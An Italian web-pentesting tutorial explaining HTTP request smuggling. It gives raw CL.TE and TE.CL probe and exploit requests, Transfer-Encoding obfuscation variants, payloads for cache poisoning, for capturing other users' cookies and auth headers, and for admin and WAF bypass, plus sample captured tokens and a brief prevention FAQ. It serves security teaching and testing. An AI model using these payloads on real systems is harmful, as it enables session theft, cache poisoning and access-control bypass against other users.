---
title: 'HTTP Request Smuggling: Desync, Cache Poisoning e Cookie Theft'
slug: http-request-smuggling
description: 'Scopri come testare HTTP Request Smuggling nel pentesting web: CL.TE, TE.CL, desync proxy-backend, cache poisoning e furto di cookie.'
image: /http-request-smuggling.webp
draft: true
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - http injection
---

L'**HTTP Request Smuggling** sfrutta il disaccordo tra un reverse proxy (CDN, WAF, load balancer) e il backend su dove **finisce una request HTTP e ne inizia un'altra**. HTTP offre due modi per indicare la lunghezza del body: `Content-Length` (numero fisso di byte) e `Transfer-Encoding: chunked` (body diviso in chunk). Se il proxy usa `Content-Length` e il backend usa `Transfer-Encoding` (o viceversa), l'attaccante "contrabbanda" una seconda request nascosta dentro la prima.

L'attaccante inietta una request che il backend interpreta come proveniente dal prossimo utente legittimo. Questo permette di **avvelenare la cache**, **bypassare WAF e autenticazione**, e **catturare cookie e credenziali di altri utenti**. È una delle vulnerabilità più difficili da trovare e da correggere — e una delle più devastanti.

Satellite della [guida pillar Misc & Infra Attacks](https://hackita.it/articoli/misc-infra-attacks-guida-completa). Vedi anche: [Cache Poisoning](https://hackita.it/articoli/cache-poisoning), [CORS Misconfiguration](https://hackita.it/articoli/cors-misconfiguration).

Riferimenti: [PortSwigger Request Smuggling](https://portswigger.net/web-security/request-smuggling), [James Kettle — HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn), [HackTricks Request Smuggling](https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html).

***

## Detection

### Step 1: Identifica L'Infrastruttura

```bash
# C'è un proxy/CDN/WAF davanti al backend?
# Header che lo rivelano:
curl -sI "https://target.com/" | grep -iE "server|via|x-served|x-cache|cf-ray|x-amz"

# Server: nginx                → Nginx come proxy
# Via: 1.1 vegur               → Heroku
# CF-Ray: ...                  → Cloudflare
# X-Cache: Hit from cloudfront → AWS CloudFront
# X-Served-By: cache-...      → Fastly/Varnish

# Se c'è un proxy davanti al backend → Request Smuggling possibile
```

### Step 2: Burp HTTP Request Smuggler (Automatico)

```bash
# Installa "HTTP Request Smuggler" dal BApp Store
# Click destro su host → Extensions → HTTP Request Smuggler → Scan
# L'extension testa CL.TE, TE.CL e varianti automaticamente
# Se trova qualcosa → "Issue" nel Dashboard con il payload
```

### Step 3: Test Manuale — Timing Technique

```http
# === CL.TE probe ===
# Se il backend interpreta TE, questa request causerà un delay:
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q

# Il proxy (CL) legge 4 byte → fine. Il backend (TE) aspetta il chunk finale "0\r\n\r\n"
# → Timeout sulla response = CL.TE confermato

# === TE.CL probe ===
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

# Il proxy (TE) legge fino al chunk "0" → fine. Il backend (CL) legge 6 byte → include "X\r\n"
# → "X" si attacca alla prossima request → errore "Unrecognized method XGET" = TE.CL confermato
```

### Step 4: Differential Response (Conferma Definitiva)

```http
# Smuggle una request che cambia la response della PROSSIMA request:

# CL.TE:
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404-page HTTP/1.1
X-Ignore: 

# Se la PROSSIMA request legittima riceve un 404 → smuggling confermato!
# Il "GET /404-page" si è attaccato alla request dell'utente successivo
```

***

## I Due Attacchi Base

### CL.TE (Proxy usa Content-Length, Backend usa Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Il proxy legge `Content-Length: 13` → inoltra 13 byte come UNA request. Il backend legge `Transfer-Encoding: chunked` → chunk `0` = fine body → `SMUGGLED` diventa l'inizio della **prossima request**.

### TE.CL (Proxy usa Transfer-Encoding, Backend usa Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Il proxy legge TE → inoltra tutto come UNA request. Il backend legge `Content-Length: 3` → legge solo `8\r\n` → `SMUGGLED\r\n0\r\n` = inizio **prossima request**.

### Varianti Transfer-Encoding (Bypass WAF/Proxy)

```http
# Il proxy non riconosce queste varianti, il backend sì (o viceversa):
Transfer-Encoding: chunked
Transfer-Encoding : chunked           # Spazio prima di :
Transfer-Encoding:  chunked           # Doppio spazio
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: x                  # Double header
Transfer-encoding: chunked            # Case diverso
Transfer-Encoding:
 chunked                               # Line folding (RFC 7230 deprecated)
Transfer-Encoding: chunked\r\nX: Y    # Header injection via CRLF
```

***

## Exploitation

### Cache Poisoning (Massimo Impatto)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 128
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
Content-Length: 10

x=
```

La request smugglata (`GET /static/main.js`) si attacca alla prossima request legittima. Se quella era per `/homepage`, la response di `main.js` viene cachata come homepage → **tutti gli utenti ricevono la response sbagliata**. Con un redirect nella request smugglata → tutti gli utenti vengono reindirizzati a `evil.com`.

### Cattura Request Di Altri Utenti

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /api/comments HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

comment=
```

La request smugglata ha `Content-Length: 800` ma body incompleto (`comment=`). La prossima request di un altro utente (con Cookie, Authorization, body) viene **appesa al parametro `comment`** → salvata come commento → l'attaccante la legge. 800 byte catturano quasi tutti gli header sensibili.

### Auth Bypass / WAF Bypass

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Cookie: admin=true

```

`/admin` protetto da IP whitelist → la request smugglata con `X-Forwarded-For: 127.0.0.1` bypassa il controllo. Stessa logica per bypassare regole WAF: il WAF vede solo la request esterna (legittima), non quella smugglata.

### Request Smuggling via HTTP/2 Downgrade

```bash
# Se il proxy parla HTTP/2 col client ma HTTP/1.1 col backend:
# HTTP/2 non usa Content-Length/Transfer-Encoding nello stesso modo
# Il proxy traduce HTTP/2 → HTTP/1.1 → possibili desync

# Burp → Target → seleziona "HTTP/2" nelle opzioni di connessione
# HTTP Request Smuggler testa automaticamente i downgrade
```

***

## Output Reale

### Detection

```
HTTP Request Smuggler → Scan target.com
[!] CL.TE confirmed on target.com
    Payload: POST / with CL:6, TE:chunked, body "0\r\n\r\nG"
    Evidence: next request returned "Unrecognized method GGET"
    # "G" smugglato + "GET" della prossima request → "GGET"
```

### Cattura Cookie

```bash
# Dopo il smuggling → leggi i commenti:
$ curl -s "https://target.com/api/comments?latest=true" | python3 -m json.tool

{
  "comments": [{
    "id": 4523,
    "text": "GET /dashboard HTTP/1.1\r\nHost: target.com\r\nCookie: session=eyJhbGciOiJIUzI1NiJ9...\r\nAuthorization: Bearer sk_live_4eC39Hq...",
    "author": "anonymous"
  }]
}
# → Cookie E token API di un altro utente catturati!
```

***

## Workflow Operativo

**Step 1** → Identifica infrastruttura: proxy/CDN/WAF? (header Server, Via, CF-Ray, X-Cache)

**Step 2** → Burp HTTP Request Smuggler → scan automatico

**Step 3** → Se confermato → determina tipo (CL.TE o TE.CL) e testa varianti TE

**Step 4** → Exploitation: cache poisoning, cattura request, auth/WAF bypass

**Step 5** → Documenta impatto: utenti colpibili, dati catturabili, durata cache

***

## Caso Studio

**Settore:** E-commerce, Nginx proxy + Node.js backend.

Burp ha confermato CL.TE: Nginx usava Content-Length, Node.js preferiva Transfer-Encoding. Request smugglata con POST a `/api/feedback` + Content-Length lungo → le request degli utenti successivi venivano scritte nel campo feedback. In 10 minuti: catturati cookie di sessione di 3 utenti e 1 Authorization header con API key Stripe.

**Un disaccordo tra Nginx e Node.js → credenziali di altri utenti in chiaro.**

***

## FAQ

### Serve un proxy davanti al backend?

Sì. Il Request Smuggling richiede almeno due componenti (proxy + backend) che interpretano la stessa request in modo diverso. Se il backend è esposto direttamente senza proxy, l'attacco non è possibile.

### Funziona con HTTP/2?

HTTP/2 gestisce il framing in modo diverso, ma se il proxy fa downgrade da HTTP/2 a HTTP/1.1 verso il backend, il desync è ancora possibile. È il vettore emergente più studiato — vedi la ricerca di James Kettle su HTTP/2 request smuggling.

### Come lo previeni?

Configura proxy e backend per usare lo **stesso metodo** (entrambi CL o entrambi TE). Disabilita il support chunked se non necessario. Normalizza le request nel proxy prima di inoltrare. Usa HTTP/2 end-to-end senza downgrade.

### Gli scanner lo trovano?

La maggior parte degli scanner automatici (Nessus, Acunetix) **non** lo trovano. Serve Burp con l'extension HTTP Request Smuggler di James Kettle, o test manuali con timing technique.

***

## ✅ Checklist

```
DETECTION
☐ Proxy/CDN/WAF identificato (header Server, Via, CF-Ray)
☐ Burp HTTP Request Smuggler eseguito
☐ CL.TE timing probe testato
☐ TE.CL timing probe testato
☐ Varianti Transfer-Encoding testate (spazio, tab, case, double, folding)
☐ HTTP/2 downgrade testato
☐ Differential response confermata (404 sulla prossima request)

EXPLOITATION
☐ Cache poisoning: CDN/proxy con cache? TTL?
☐ Cattura request: endpoint che salva input (comments, feedback)?
☐ Auth bypass: /admin con X-Forwarded-For smugglato?
☐ WAF bypass: payload bloccato dal WAF passato via smuggling?

IMPATTO
☐ Utenti colpibili dal cache poisoning stimati
☐ Dati catturabili (cookie, auth header, body PII)
☐ Durata cache poisoning (TTL)
```

***

> Il tuo proxy e il backend concordano su Content-Length vs Transfer-Encoding? [Penetration test HackIta](https://hackita.it/servizi). Dal desync al credential theft: [formazione 1:1](https://hackita.it/formazione).
